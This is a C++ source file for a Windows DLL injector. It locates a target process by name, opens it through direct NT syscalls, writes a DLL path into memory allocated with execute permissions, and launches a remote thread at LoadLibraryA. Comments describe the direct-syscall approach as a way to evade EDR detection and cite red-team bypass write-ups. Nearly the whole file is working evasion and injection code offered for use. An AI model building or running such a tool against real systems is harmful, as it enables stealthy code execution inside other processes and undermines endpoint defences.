#include "inj.h"
#include "kernel_abstract.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <iostream>
#include <memory>
#include <random>
#include <cwchar>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * to build, 64 bit only right now (only guaranteed on Win11-23h2):
 * 
 * g++ -c -o inj.o inj.cpp -DUNICODE
 * ar rcs libinj.a inj.o
 * g++ inj.o -o inj.exe // for building just the c injector without go
 * or just use the build bat script :-)
 * 
 * Inspired by research I have conducted from the below sources:
 * My own CGO DLL injector (this was supposed to be modifications but has turned into a rewrite & deeper learning)
 * https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
 * https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/
 * https://codemachine.com/articles/system_call_instructions.html 
 * https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls 
 * https://github.com/lsecqt / https://www.youtube.com/@Lsecqt 
 * https://github.com/cr-0w
 * https://alice.climent-pommeret.red/
 * https://blog.maikxchd.com/evading-edrs-by-unhooking-ntdll-in-memory

*/

#define MAX_DLL_PATH 255
#define ERROR_LOGGING_ENABLED 1

int main(int argc, char *argv[]) {
    int res = openProcAndExec(argv[1], argv[2]); // [1] is dll path, [2] e.g. notepad.exe
}

/**
 * @brief Retrieves a handle to a process by its name.
 *
 * This function scans all processes currently running in the system to find a process
 * that matches the specified name. It creates a snapshot of all processes, iterates through
 * this list, and compares each process's name with the provided process name. When a match is found,
 * it uses a direct syscall to `NtOpenProcess` to open the process with all possible access rights and
 * returns a handle to the identified process.
 *
 * This approach bypasses the standard Windows API, evading EDR detection and monitoring which target 
 * higher-level API functions.
 *
 * @param processName A string representing the name of the process to find.
 * @return HANDLE Returns a handle to the process if found, NULL otherwise.
 */
HANDLE getHandleToProcessByName(const char* processName) {
    PROCESSENTRY32 entry; // stores process entry information
    entry.dwSize = sizeof(PROCESSENTRY32); // size of the structure
    char buf[MAX_PATH] = {}; // buffer to store the name of the executable
    size_t charsConverted = 0;
    HANDLE snapshot = NULL;
    
    // for direct calls via ntdll.dll 
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
    NTSTATUS status = 0x0;
    HANDLE hProcess = NULL;

    // snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printError("Failed to create process snapshot");
        return 0; // return 0 if snapshot creation fails
    }

    // iterate over all processes in the snapshot
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            // convert process name from wide char to multibyte string
            wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);

            // check if current process name matches the target process name
            if (_stricmp(buf, processName) == 0) {
                // open the process with all possible access rights (n.b. not calling via ntdll as we dont yet have the pid)
                ULONG_PTR processIdPtr = static_cast<ULONG_PTR>(entry.th32ProcessID);
                CLIENT_ID clientId = { reinterpret_cast<HANDLE>(processIdPtr), nullptr };
                status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &clientId); // direct call

                if (status == 0x0) {
                    NtClose(snapshot); // close the snapshot handle as it is no longer needed
                    return hProcess; // return the process ID TODO just return the handle?
                }
            }
        }
    }

    NtClose(snapshot); // close the snapshot handle if process not found
    printError("Target process not found");
    return NULL; // return 0 if process not found
}


/**
 * @brief Opens a specified process and executes a DLL injection.
 *
 * This function performs DLL injection into a specified process. It first retrieves
 * the process ID of the target process, then allocates memory within that process to
 * store the DLL path. After writing the DLL path into the allocated memory, it creates
 * a remote thread in the target process to execute `LoadLibraryA`, loading the
 * specified DLL into the process's address space.
 *
 * @param pathToDLL A string containing the path to the DLL to be injected.
 * @param processToInj A string specifying the name of the process to inject the DLL into.
 * @return int Returns 0 on successful injection, -1 on failure.
 */
int openProcAndExec(const char *pathToDLL, const char *processToInj) {

    // define the SSN of the NTAPI call chain we are bypassing
    // note the variables to store the SSN are declared in kernel_abstract.h
    HMODULE hNTDLL = getModule(L"NTDLL");
    wNtOpenProcess = getSSN(hNTDLL, "NtOpenProcess");

    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };
    NTSTATUS status = 0x0;
    PVOID alloc = NULL;

    // validate input params 
    if (pathToDLL == NULL || processToInj == NULL) {
        printError("Invalid usage: inj.exe 'path_to_all.dll' 'process_to_inject_into.exe'. Quitting...");
        return -1; // return error if input params are null
    }

    char dllPathToInject[MAX_DLL_PATH];
    if (strlen(pathToDLL) >= sizeof(dllPathToInject)) {
        printError("DLL path length exceeds buffer size");
        return -1;
    }
    
    // safely copy path to DLL into a local buffer
    strncpy(dllPathToInject, pathToDLL, sizeof(dllPathToInject));
    dllPathToInject[sizeof(dllPathToInject) - 1] = '\0'; // ensure null termination
    size_t dllPathLength = strlen(dllPathToInject) + 1; // length including null terminator

    // get a handle to the process we wish to inject into 
    HANDLE hProcess = getHandleToProcessByName(processToInj);
    if (hProcess == NULL) {
        return -1;
    }

    // get handle to the Kernel32.dll and the address of LoadLibraryA
    HMODULE hK32 = getModule(L"Kernel32");
    if (!hK32) {
        printError("Failed to get handle to Kernel32.dll");
        return -1;
    }
    
    // get modules
    PTHREAD_START_ROUTINE loadlib = (PTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");


    // allocate memory in the target process for the DLL path
    status = NtAllocateVirtualMemory(hProcess, &alloc, 0, &dllPathLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (status != 0x0) {
        NtClose(hProcess);
        printError("Failed to allocate memory in target process");
        return -1; // return error if memory allocation fails
    }

    // write to the allocated memory in the target process
    status = NtWriteVirtualMemory(hProcess, alloc, dllPathToInject, sizeof(dllPathToInject), NULL);
    if (status != 0x0) {
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        NtClose(hProcess);
        printError("Failed to write DLL path to process memory");
        return -1; // return error if writing to process memory fails
    }

    /**
     * Create a remote thread in the target process to load the DLL.
     * The function pointer LoadLibraryA is used as the starting address for the remote thread, and the allocated
     * memory (containing the DLL path) is passed as an argument to LoadLibraryA. This effectively loads the DLL into the target process.
    */
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)loadlib, alloc, FALSE, 0, 0, 0, 0);

    if (status != 0x0) {
        VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
        NtClose(hProcess);

        char errorMessage[256];
        sprintf(errorMessage, "Failed to create remote thread, error: 0x%lx", status);
        printError(errorMessage);

        return -1; // return error if thread creation fails
    }

    // wait for the remote thread to complete
    WaitForSingleObject(hThread, INFINITE);

    // clean up - close handles and free memory
    NtClose(hThread);
    VirtualFreeEx(hProcess, alloc, 0, MEM_RELEASE);
    NtClose(hProcess);

    return 0;
}

/**
 * Some logging functions.
*/
void logPrintLn(const char* printType, const char* message) {
    if (ERROR_LOGGING_ENABLED) {
        std::cerr << printType << message << std::endl;
    }
}
void printInfo(const char* message) {
    logPrintLn("[i] Info: ", message);
}

void printError(const char* message) {
    logPrintLn("[-] Error: ", message);
}

/**
 * @brief Finds system module for given module name
 * 
 * @param moduleName A string representing the name of the module. Made some improvements to
 * cr0w's function with some additional error handling.
 * Credit for the base func https://github.com/cr-0w
 * 
*/
HMODULE getModule(LPCWSTR moduleName) {
    if (moduleName == nullptr) {
        printError("Null module name provided to getModule");
        return nullptr;
    }

    HMODULE hModule = GetModuleHandle(moduleName);
    if (hModule == nullptr) {
        // get the system error message
        LPVOID lpMsgBuf;
        DWORD dw = GetLastError(); 

        FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            nullptr,
            dw,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPWSTR) &lpMsgBuf,
            0, nullptr );

        // convert to a narrow character string and print the error
        char moduleNameNarrow[256];
        wcstombs(moduleNameNarrow, moduleName, 256);

        char combinedMessage[512];
        snprintf(combinedMessage, 512, "Failed to load module %s: %s", moduleNameNarrow, (char*)lpMsgBuf);

        printError(combinedMessage);
        LocalFree(lpMsgBuf);

        return nullptr;
    }

    return hModule;
}


/**
 * @brief Retrieves the System Service Number (SSN) of a specified NT function.
 *
 * Obtain the SSN of a given NT function within the Windows NTAPI. We attempt to locate 
 * the address of the specified function using GetProcAddress
 * If successful, we calculate the SSN by accessing the specific offset in the function's
 * memory address.
 * 
 * Inspired by https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls and https://github.com/cr-0w
 * and added some of my own stuff & explanations.
 *
 * @param dllModule A handle to the loaded NT DLL module (ntdll.dll)
 * @param NtFunction A string specifying the name of the NT function to retrieve the SSN for
 * @return DWORD Returns the SSN of the specified function. Returns 0 if the function's address
 *               cannot be found or if an error occurs during retrieval
 */
DWORD getSSN(IN HMODULE dllModule, IN LPCSTR NtFunction) {
    char logBuffer[256];

    FARPROC NtFunctionAddress = GetProcAddress(dllModule, NtFunction);

    if (NtFunctionAddress == NULL) {
        sprintf(logBuffer, "Failed to get the address of %s", NtFunction);
        printError(logBuffer);
        return 0;
    }

    /**
     * 
     * 
     *  public NtOpenProcess
            NtOpenProcess PROC
                mov r10, rcx                ; 3 bytes
                mov eax, wNtOpenProcess     ; mov (1 byte) + 28h (4 bytes) = 5 bytes
                syscall
                ret
            NtOpenProcess ENDP

     * With the below, take the byte pointer of the NT Function, then add 4 bytes to the memory location we are pointing to.
     * Here we will find the SSN (see above math).
     * Cast this location as a pointer to a double word (i.e. 4 bytes)
     * Dereference that pointer, to get the underlying value from where we were pointing.
     * 
    */
    DWORD NtFunctionSSN = *((PDWORD)((PBYTE)NtFunctionAddress + 4));

    // sprintf(logBuffer, "SSN of %s: 0x%lx (Address: 0x%p+0x4)", NtFunction, NtFunctionSSN, (void*)NtFunctionAddress);
    // printInfo(logBuffer);
    return NtFunctionSSN;
}

#ifdef __cplusplus
}
#endif